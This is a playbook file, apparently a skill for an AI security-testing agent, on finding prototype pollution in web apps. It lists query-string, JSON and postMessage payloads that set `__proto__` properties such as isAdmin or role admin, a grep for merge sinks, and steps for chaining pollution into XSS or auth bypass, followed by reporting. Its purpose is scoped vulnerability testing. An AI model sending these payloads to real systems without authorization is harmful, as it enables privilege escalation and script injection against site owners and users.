---
name: proto-pollution
description: Client-side prototype pollution and gadget chain playbook — `__proto__`, constructor pollution in JSON merge, URL parsers, and postMessage handlers leading to XSS or auth bypass. Use when the app uses deep merge libraries, jQuery.extend, lodash merges, or client-side routing/query parsers.
allowed-tools:
  - shell
  - http
  - web_fetch
  - grep
  - confirm_finding
  - file_write
---

# Prototype pollution playbook

Pollution mutates `Object.prototype` — impact requires a **gadget** (sink) elsewhere in the app.

## 1. Find merge sinks
Search JS bundles for:
- `merge`, `extend`, `defaultsDeep`, `set`, query parsers
- URL param → object: `?__proto__[test]=polluted`

```sh
grep -rE '__proto__|constructor\[|prototype\]' static/js/ 2>/dev/null | head -20
```

## 2. Pollution probes
In query string, JSON body, or postMessage:

```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"role":"admin"}}}
```

Verify pollution:
```javascript
// In browser console after navigating with payload
({}).polluted  // or ({}).isAdmin
```

## 3. Gadget hunting
After pollution, trigger code paths reading:
- `obj.isAdmin` where obj is `{}`
- Config defaults merged from polluted prototype
- Template engines using polluted properties

Common gadgets → XSS via `innerHTML`, script src, or route guard bypass.

## 4. Server-side Node pollution
If backend uses vulnerable merge on JSON:
```json
{"__proto__":{"status":200,"body":"admin"}}
```
May affect Express/Koa middleware reading `req.query` defaults — test only in scope.

## 5. postMessage chains
```javascript
window.postMessage(JSON.stringify({__proto__:{vulnerable:true}}), '*')
```

If receiver merges without sanitization → pollution.

## 6. Report
Document: pollution vector, gadget file/line (from source map if available), resulting XSS or bypass.

VRT: `Cross-Site Scripting` / `Client-Side Injection`

Include URL with payload and screenshot/response proving gadget fired. Call `confirm_finding` with end-to-end impact.
